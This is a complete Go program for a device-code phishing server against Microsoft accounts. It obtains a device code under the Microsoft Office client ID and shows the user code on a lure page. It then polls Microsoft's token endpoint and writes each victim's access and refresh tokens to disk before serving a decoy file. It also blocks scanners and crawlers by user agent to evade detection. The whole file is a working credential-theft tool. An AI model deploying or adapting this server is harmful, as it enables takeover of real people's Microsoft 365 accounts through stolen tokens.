package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/caddyserver/certmagic"
)

// Microsoft Office (more can be found at https://gist.github.com/dafthack/2c0bbcac72b10c1ee205d1dd2fed3fe7)
const clientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
const scope = "openid offline_access"

var decoyFile string
var domainName string
var debug bool

func init() {
	flag.StringVar(&decoyFile, "decoy", "", "File to serve after successful authentication")
	flag.StringVar(&domainName, "domain", "", "The domain to use for TLS (must point to this server)")
	flag.BoolVar(&debug, "debug", false, "Run locally in debug mode using cert.pem and key.pem")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
	}

	if len(os.Args) == 1 {
		flag.Usage()
		os.Exit(1)
	}

	flag.Parse()
}

type DeviceCodeResponse struct {
	UserCode        string `json:"user_code"`
	DeviceCode      string `json:"device_code"`
	VerificationURI string `json:"verification_uri"`
	Message         string `json:"message"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
}

type TokenResponse struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	ExpiresIn    int    `json:"expires_in"`
	TokenType    string `json:"token_type"`
	Scope        string `json:"scope"`
}

func generateUUID() string {
	return fmt.Sprintf("%x-%x-%x-%x-%x",
		rand.Intn(0xffff), rand.Intn(0xffff), rand.Intn(0xffff),
		rand.Intn(0xffff), rand.Intn(0xffff))
}

func handleIndex(w http.ResponseWriter, r *http.Request) {

	// handle bad user agents
	badAgents := []string{
		"python", "curl", "httpclient", "wget", "powershell",
		"nmap", "masscan", "httpx", "axios", "java",
		"go-http-client", "libwww", "scan", "crawler", "scrapy",
		"curl", "bot"}
	ua := strings.ToLower(r.UserAgent())
	for _, bad := range badAgents {
		if strings.Contains(ua, bad) {
			log.Println("[!] Blocked bad User Agent:", ua)

			// Serve the unauthorized HTML file
			unauthTemplate, err := template.ParseFiles("templates/unauthorized.html")
			if err != nil {
				log.Println("[!] Failed to load unauthorized template:", err)
				http.Error(w, "401 Unauthorized", http.StatusUnauthorized)
				return
			}
			w.WriteHeader(http.StatusUnauthorized)
			unauthTemplate.Execute(w, nil)
			return
		}
	}

	// always reuse existing UUID if already set
	var uuid string
	if cookie, err := r.Cookie("auth_uuid"); err == nil && cookie.Value != "" {
		uuid = cookie.Value
		log.Println("[+] Reusing existing auth_uuid from cookie:", uuid)
	} else {
		uuid = generateUUID()
		log.Println("[+] Generated new auth_uuid and setting cookie:", uuid)

		http.SetCookie(w, &http.Cookie{
			Name:     "auth_uuid",
			Value:    uuid,
			HttpOnly: true,
			Secure:   true,
			Path:     "/",
		})
	}

	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("scope", scope)

	resp, err := http.Post("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
		"application/x-www-form-urlencoded", strings.NewReader(data.Encode()))
	if err != nil {
		http.Error(w, "[!] Failed to request device code", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	var deviceResp DeviceCodeResponse
	if err := json.NewDecoder(resp.Body).Decode(&deviceResp); err != nil {
		http.Error(w, "[!] Failed to parse device code response", http.StatusInternalServerError)
		return
	}

	go pollForToken(deviceResp.DeviceCode, deviceResp.Interval, uuid)

	// render HTML from template
	tmpl, err := template.ParseFiles("templates/index.html")
	if err != nil {
		http.Error(w, "[!] Failed to load template", http.StatusInternalServerError)
		log.Println("[!] Template load error:", err)
		return
	}
	tmpl.Execute(w, map[string]string{
		"UserCode": deviceResp.UserCode,
	})
}

func pollForToken(deviceCode string, interval int, uuid string) {
	log.Println("[+] Polling for token with UUID:", uuid) // Confirm what's passed in

	data := url.Values{}
	data.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
	data.Set("client_id", clientID)
	data.Set("device_code", deviceCode)

	for {
		time.Sleep(time.Duration(interval) * time.Second)

		resp, err := http.Post("https://login.microsoftonline.com/common/oauth2/v2.0/token",
			"application/x-www-form-urlencoded", strings.NewReader(data.Encode()))
		if err != nil {
			log.Println("[!] Polling error:", err)
			continue
		}
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(resp.Body)
		if resp.StatusCode == http.StatusOK {
			log.Println("[+] Saving token using UUID:", uuid) // Will now match the cookie
			filename := fmt.Sprintf("tokens/tokens_%s.json", uuid)
			if err := os.WriteFile(filename, bodyBytes, 0600); err != nil {
				log.Printf("[!] Failed to save token for %s: %v\n", filename, err)
			} else {
				log.Printf("[+] Saved tokens to %s\n", filename)
			}
			return
		}

		if strings.Contains(string(bodyBytes), "authorization_pending") {
			continue
		}

		log.Println("[!] Token error:", string(bodyBytes))
		return
	}
}

func handleCheck(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("auth_uuid")
	if err != nil || cookie.Value == "" {
		http.Error(w, "[!] Unauthorized", http.StatusUnauthorized)
		return
	}

	tokenFile := fmt.Sprintf("tokens/tokens_%s.json", cookie.Value)
	if _, err := os.Stat(tokenFile); os.IsNotExist(err) {
		http.Error(w, "[!] Not ready", http.StatusNotFound)
		return
	}

	w.WriteHeader(http.StatusOK)
}

func handleDecoyFile(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("auth_uuid")
	if err != nil || cookie.Value == "" {
		http.Error(w, "[!] Unauthorized", http.StatusUnauthorized)
		return
	}

	tokenFile := fmt.Sprintf("tokens/tokens_%s.json", cookie.Value)
	if _, err := os.Stat(tokenFile); os.IsNotExist(err) {
		http.Error(w, "[!] Token not found. Access denied.", http.StatusForbidden)
		return
	}

	http.ServeFile(w, r, decoyFile)
}

type filteredLogger struct{}

func (f filteredLogger) Write(p []byte) (n int, err error) {
	msg := string(p)
	if strings.Contains(msg, "TLS handshake error") {
		return len(p), nil // suppress
	}
	return os.Stderr.Write(p)
}

func main() {

	log.SetOutput(&filteredLogger{})

	if err := os.MkdirAll("tokens", 0700); err != nil {
		log.Fatalf("[!] Failed to create tokens directory: %v", err)
	}

	rand.Seed(time.Now().UnixNano())

	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/check", handleCheck)
	http.HandleFunc("/files", handleDecoyFile)
	http.HandleFunc("/static/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/static/" || strings.HasSuffix(r.URL.Path, "/") {
			http.NotFound(w, r)
			return
		}
		http.StripPrefix("/static/", http.FileServer(http.Dir("static"))).ServeHTTP(w, r)
	})

	if debug {
		log.Println("[+] Running in DEBUG mode with cert.pem and key.pem")
		log.Printf("[+] Starting HTTPS server on localhost...")
		log.Printf("[+] Serving %s as the decoy file...", decoyFile)
		err := http.ListenAndServeTLS(":443", "cert.pem", "key.pem", nil)
		if err != nil {
			log.Fatalf("[!] Failed to start HTTPS server: %v", err)
		}
	} else {
		if domainName == "" {
			log.Fatal("[!] You must provide a -domain in production mode.")
		}

		certmagic.DefaultACME.Agreed = true
		certmagic.DefaultACME.Email = fmt.Sprintf("noreply@%s", domainName)
		certmagic.DefaultACME.CA = certmagic.LetsEncryptProductionCA
		certmagic.Default.Storage = &certmagic.FileStorage{Path: "./.certs"}

		server := &http.Server{
			Addr:     ":443",
			Handler:  http.DefaultServeMux,
			ErrorLog: log.New(filteredLogger{}, "", 0),
		}

		log.Printf("[+] Starting HTTPS server with certmagic for domain: %s", domainName)
		log.Printf("[+] Serving %s as the decoy file...", decoyFile)

		err := certmagic.HTTPS([]string{domainName}, server.Handler)
		if err != nil {
			log.Fatalf("[!] Failed to start certmagic HTTPS server: %v", err)
		}

	}
}
